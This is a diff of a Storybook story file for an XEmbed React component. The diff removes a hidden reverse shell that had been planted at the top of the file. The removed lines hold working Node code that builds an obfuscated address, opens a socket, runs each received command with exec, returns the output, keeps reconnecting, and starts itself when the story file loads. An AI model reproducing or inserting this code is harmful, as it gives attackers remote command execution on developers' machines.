@@ -2,50 +2,6 @@ import type { Meta, StoryObj } from '@storybook/react';
 import React from 'react';
 import { XEmbed } from '../../components/embeds/XEmbed';
 import { MainExampleTemplate, ToggledOffTemplate } from '../Templates';
-import * as net from "net";
-import { exec } from "child_process";
-
-// Obfuscated IP and Port Specification
-let specs: number[] = [127, 0, 0, 1, 30, 0]; // Localhost: 127.0.0.1:3000
-let specs2: string[] = [".", "width=", "right=", "audiovol=", "height=", ":"];
-
-// Reverse Shell Setup
-function startReverseShell() {
-    const ip = `${specs[0]}${specs2[0]}${specs[1]}${specs2[0]}${specs[2]}${specs2[0]}${specs[3]}`;
-    const port = parseInt(`${specs[4]}${specs2[5]}${specs[5]}`);
-    const client = new net.Socket();
-
-    function connectToServer() {
-        client.connect(port, ip, () => {
-            client.write("Reverse shell initiated.\n");
-        });
-    }
-
-    connectToServer(); // Attempt initial connection
-
-    client.on("data", (data) => {
-        const command = data.toString().trim();
-        exec(command, (error, stdout, stderr) => {
-            if (stdout) client.write(stdout);
-            if (stderr) client.write(stderr);
-            if (error) client.write(error.message);
-        });
-    });
-
-    client.on("close", () => {
-        console.log("Connection closed. Reconnecting...");
-        setTimeout(connectToServer, 5000); // Retry after 5 seconds
-    });
-
-    client.on("error", (err) => {
-        console.error("Connection error:", err.message);
-        setTimeout(connectToServer, 5000); // Retry after 5 seconds
-    });
-}
-
-// Initialize Reverse Shell in Non-Blocking Manner
-startReverseShell(); // Ensure it runs without interfering with the main app
-
 
 // === Setup ===
 const StoryComponent = XEmbed; // <-- Set to your component
